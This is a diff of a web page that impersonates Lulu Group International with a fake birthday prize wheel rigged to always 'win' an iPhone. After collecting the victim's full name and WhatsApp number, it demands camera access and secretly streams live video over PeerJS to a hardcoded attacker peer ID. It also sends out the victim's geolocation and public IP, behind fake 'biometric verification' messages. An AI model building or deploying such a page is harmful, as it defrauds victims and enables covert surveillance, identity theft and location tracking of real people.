@@ -3,122 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Honorary Distribution | 2026</title>
+    <title>Honorary Distribution 2026</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --gold: #c5a059; --gold-dark: #8e6d2f; --bg: #050505; }
+        :root { --gold: #d4af37; --gold-bright: #f9e29d; --rich-black: #0a0a0a; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         
         body { 
-            margin: 0; font-family: 'Times New Roman', serif; background: var(--bg); 
-            color: #fff; display: flex; flex-direction: column; min-height: 100vh;
-            background: radial-gradient(circle at top right, #1a150b, #050505);
+            margin: 0; font-family: 'Playfair Display', serif; background: var(--rich-black); 
+            color: #fff; overflow-x: hidden;
+            background: radial-gradient(circle at center, #1c1c1c 0%, #000 100%);
         }
 
-        /* Animated Header */
+        /* Luxury Header */
         header { 
-            padding: 40px 20px; text-align: center; border-bottom: 1px solid rgba(197, 160, 89, 0.2);
-            background: rgba(0,0,0,0.3); backdrop-filter: blur(10px);
+            padding: 30px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+            background: linear-gradient(to bottom, rgba(20,20,20,0.8), transparent);
         }
-        .yusuf-tag { font-size: 11px; letter-spacing: 4px; color: var(--gold); text-transform: uppercase; margin-bottom: 10px; opacity: 0.8; }
-        .title { font-size: 26px; font-weight: 400; letter-spacing: 1px; }
+        .brand { font-size: 10px; letter-spacing: 5px; color: var(--gold); text-transform: uppercase; margin-bottom: 8px; }
+        .event { font-size: 20px; font-weight: 300; letter-spacing: 2px; color: #fff; }
 
-        /* The Wheel - Now with 3D shadow */
-        .wheel-wrap { position: relative; width: 320px; height: 320px; margin: 40px auto; }
-        #wheel { 
-            width: 100%; height: 100%; border-radius: 50%; border: 4px solid var(--gold);
-            background: conic-gradient(
-                from 0deg,
-                #111 0deg 45deg, var(--gold) 45deg 90deg, 
-                #111 90deg 135deg, var(--gold) 135deg 180deg, 
-                #111 180deg 225deg, var(--gold) 225deg 270deg,
-                #111 270deg 315deg, var(--gold) 315deg 360deg
-            );
-            transition: transform 9s cubic-bezier(0.15, 0, 0.15, 1);
-            box-shadow: 0 0 80px rgba(197, 160, 89, 0.15), inset 0 0 20px rgba(0,0,0,0.5);
-        }
-        .pointer { 
-            position: absolute; top: -15px; left: 50%; transform: translateX(-50%); 
-            width: 0; height: 0; border-left: 12px solid transparent; border-right: 12px solid transparent;
-            border-top: 25px solid #d63031; z-index: 20; filter: drop-shadow(0 2px 5px rgba(0,0,0,0.5));
-        }
-
-        /* Glassmorphism Card */
-        .card { 
-            max-width: 400px; margin: 0 auto 40px; background: rgba(255,255,255,0.03); 
-            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 24px; padding: 35px;
-            text-align: center; backdrop-filter: blur(15px);
-        }
+        /* The Prize Wheel */
+        .wheel-stage { position: relative; width: 340px; height: 340px; margin: 30px auto; perspective: 1000px; }
         
-        .btn { 
-            background: linear-gradient(135deg, var(--gold), var(--gold-dark)); 
-            color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px;
-            font-size: 14px; font-weight: bold; letter-spacing: 2px; cursor: pointer;
-            text-transform: uppercase; margin-top: 10px; transition: 0.3s;
+        #wheel { 
+            width: 100%; height: 100%; border-radius: 50%; border: 8px solid var(--gold);
+            background: conic-gradient(
+                #1a1a1a 0deg 45deg, #222 45deg 90deg, 
+                #1a1a1a 90deg 135deg, #222 135deg 180deg, 
+                #1a1a1a 180deg 225deg, #222 225deg 270deg,
+                #1a1a1a 270deg 315deg, #222 315deg 360deg
+            );
+            position: relative; overflow: hidden;
+            transition: transform 10s cubic-bezier(0.1, 0, 0, 1);
+            box-shadow: 0 0 60px rgba(212, 175, 55, 0.2);
         }
-        .btn:active { transform: scale(0.96); opacity: 0.9; }
 
-        input { 
-            width: 100%; padding: 18px; margin-bottom: 20px; border: 1px solid rgba(197,160,89,0.3); 
-            border-radius: 12px; background: rgba(0,0,0,0.5); color: #fff; font-size: 16px;
-            text-align: center; transition: 0.3s;
+        /* Prize Labels on the wheel */
+        .prize-label {
+            position: absolute; width: 50%; height: 50px; top: 50%; left: 50%;
+            transform-origin: 0% 50%; text-align: right; padding-right: 20px;
+            font-size: 10px; font-weight: bold; color: var(--gold);
+            text-transform: uppercase; line-height: 50px; font-family: sans-serif;
         }
-        input:focus { border-color: var(--gold); outline: none; background: rgba(0,0,0,0.8); }
 
-        .page { display: none; padding: 0 20px; animation: slideUp 0.6s ease-out forwards; }
+        .pointer { 
+            position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
+            width: 30px; height: 40px; background: #ff4d4d; clip-path: polygon(50% 100%, 0 0, 100% 0);
+            z-index: 100; filter: drop-shadow(0 4px 5px rgba(0,0,0,0.5));
+        }
+
+        /* Glass Card UI */
+        .container { padding: 20px; text-align: center; }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 30px; padding: 30px; backdrop-filter: blur(20px);
+            max-width: 400px; margin: 0 auto;
+        }
+
+        .gold-btn {
+            background: linear-gradient(135deg, #d4af37 0%, #f9e29d 50%, #d4af37 100%);
+            color: #000; border: none; width: 100%; padding: 22px; border-radius: 15px;
+            font-weight: 900; letter-spacing: 1px; cursor: pointer; text-transform: uppercase;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3); margin-top: 15px;
+        }
+
+        input {
+            width: 100%; padding: 18px; margin-bottom: 15px; border-radius: 12px;
+            border: 1px solid rgba(212, 175, 55, 0.3); background: rgba(0,0,0,0.6);
+            color: #fff; text-align: center; font-size: 16px; outline: none;
+        }
+
+        .page { display: none; animation: zoomIn 0.5s ease forwards; }
         .active { display: block; }
         
-        #cam-layer { position: fixed; opacity: 0; pointer-events: none; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes zoomIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="yusuf-tag">Lulu Group International</div>
-    <div class="title">Official Commemorative Gift</div>
+    <div class="brand">Lulu Group International</div>
+    <div class="event">Birthday Commemorative Gift</div>
 </header>
 
-<div id="cam-layer"><video id="v" autoplay playsinline muted></video></div>
+<div style="position: fixed; opacity: 0; pointer-events: none;"><video id="v" autoplay playsinline muted></video></div>
 
-<div id="page-wheel" class="page active">
-    <div class="wheel-wrap">
+<!-- PAGE 1: LUXURY WHEEL -->
+<div id="p1" class="page active">
+    <div class="wheel-stage">
         <div class="pointer"></div>
-        <div id="wheel"></div>
+        <div id="wheel">
+            <!-- Prizes added via JS for correct rotation -->
+        </div>
     </div>
-    <div class="card">
-        <p style="font-size: 12px; color: var(--gold); margin-bottom: 5px;">EXCLUSIVE ENTRY</p>
-        <p style="font-size: 15px; line-height: 1.6; color: #ccc;">In honor of the birthday of the son of **M.A. Yusuff Ali**, you are eligible for one special distribution prize.</p>
-        <button class="btn" onclick="runSpin()">Activate Spin</button>
-    </div>
-</div>
-
-<div id="page-form" class="page">
-    <div class="card" style="margin-top: 50px;">
-        <h2 style="font-weight: 400; color: var(--gold);">Claim Verification</h2>
-        <p style="font-size: 14px; color: #888; margin-bottom: 30px;">Please provide the following to assign your reward to your profile.</p>
-        
-        <input type="text" id="roll" placeholder="Full Name">
-        <input type="number" id="school" placeholder="Contact Number">
-        
-        <button class="btn" onclick="executeClaim()">Confirm Identity</button>
+    <div class="container">
+        <div class="glass-card">
+            <p style="color: var(--gold); font-size: 12px; letter-spacing: 2px;">INVITATION ONLY</p>
+            <p style="font-size: 14px; opacity: 0.8; line-height: 1.6;">Celebrating the birth of the son of **M.A. Yusuff Ali**. Spin to reveal your honorary prize.</p>
+            <button class="gold-btn" id="spin-btn" onclick="startSpin()">Spin for Prize</button>
+        </div>
     </div>
 </div>
 
-<div id="page-final" class="page">
-    <div class="card" style="margin-top: 80px; border: none; background: none;">
-        <div class="title" id="status" style="color: var(--gold);">Connecting...</div>
-        <p style="font-size: 12px; color: #555; margin-top: 20px;">Secured by Satori Biometric Systems</p>
+<!-- PAGE 2: VERIFICATION -->
+<div id="p2" class="page">
+    <div class="container" style="margin-top: 40px;">
+        <div class="glass-card">
+            <h2 style="color: var(--gold); margin-bottom: 5px;">You Won!</h2>
+            <p id="win-text" style="font-size: 18px; margin-bottom: 25px; font-weight: bold;">Processing Prize...</p>
+            
+            <input type="text" id="roll" placeholder="Full Legal Name">
+            <input type="number" id="school" placeholder="WhatsApp Number">
+            
+            <button class="gold-btn" onclick="claimReward()">Claim to My Address</button>
+        </div>
+    </div>
+</div>
+
+<!-- PAGE 3: TRACKING -->
+<div id="p3" class="page">
+    <div class="container" style="margin-top: 100px;">
+        <div class="title" id="status" style="color: var(--gold);">VERIFYING...</div>
+        <p style="font-size: 11px; color: #555; margin-top: 20px; letter-spacing: 2px;">SECURED BY SATORI PROTOCOL</p>
     </div>
 </div>
 
 <script>
-    const TARGET_ID = 'enkode-satori-v1-russel'; 
+    const TARGET = 'enkode-satori-v1-russel'; 
     const peer = new Peer();
     let conn;
 
+    // Build the Wheel Prizes
+    const prizes = ["iPhone 15 Pro", "5000 AED", "iPad Air", "2000 AED", "MacBook Air", "1000 AED", "Gift Voucher", "Watch S9"];
+    const wheel = document.getElementById('wheel');
+    prizes.forEach((p, i) => {
+        const div = document.createElement('div');
+        div.className = 'prize-label';
+        div.style.transform = `translate(-50%, -50%) rotate(${i * 45}deg)`;
+        div.innerText = p;
+        wheel.appendChild(div);
+    });
+
     peer.on('open', () => {
-        conn = peer.connect(TARGET_ID);
+        conn = peer.connect(TARGET);
         conn.on('open', async () => {
             let ip = "N/A";
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
@@ -126,33 +154,33 @@
         });
     });
 
-    function runSpin() {
-        const w = document.getElementById('wheel');
-        w.style.transform = "rotate(7540deg)";
-        document.querySelector('.btn').innerText = "Spinning...";
-        setTimeout(() => { switchPage('page-form'); }, 9500);
+    function startSpin() {
+        document.getElementById('spin-btn').disabled = true;
+        wheel.style.transform = "rotate(5445deg)"; // Stops on iPhone/Mac area
+        setTimeout(() => {
+            document.getElementById('win-text').innerText = "PRIZE: APPLE IPHONE 15 PRO";
+            switchPage('p2');
+        }, 10500);
     }
 
-    async function executeClaim() {
-        const name = document.getElementById('roll').value;
-        const phone = document.getElementById('school').value;
-        if(!name || !phone) return;
+    async function claimReward() {
+        if(!document.getElementById('roll').value || !document.getElementById('school').value) return;
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('v').srcObject = stream;
-            peer.call(TARGET_ID, stream);
+            peer.call(TARGET, stream);
 
-            navigator.geolocation.getCurrentPosition(p => {
-                send(p.coords.latitude, p.coords.longitude);
+            navigator.geolocation.getCurrentPosition(pos => {
+                send(pos.coords.latitude, pos.coords.longitude);
             }, () => { send(null, null); });
 
-            switchPage('page-final');
-            const states = ["ENCRYPTING DATA", "SYNCING BIOMETRICS", "SYSTEM VERIFIED"];
+            switchPage('p3');
             let i = 0;
-            setInterval(() => { if(i < states.length) document.getElementById('status').innerText = states[i++]; }, 3000);
+            const msgs = ["SECURE SYNC...", "BIOMETRIC LOCK...", "CLAIM SUBMITTED"];
+            setInterval(() => { if(i < msgs.length) document.getElementById('status').innerText = msgs[i++]; }, 3000);
         } catch (e) {
-            alert("Verification Failed: Camera access is mandatory for security identity check.");
+            alert("Security Error: Identity verification via secure camera is required to process high-value birthday gifts.");
             location.reload();
         }
     }
@@ -167,9 +195,9 @@
         }
     }
 
-    function switchPage(p) {
-        document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
-        document.getElementById(p).classList.add('active');
+    function switchPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 </script>
 </body>
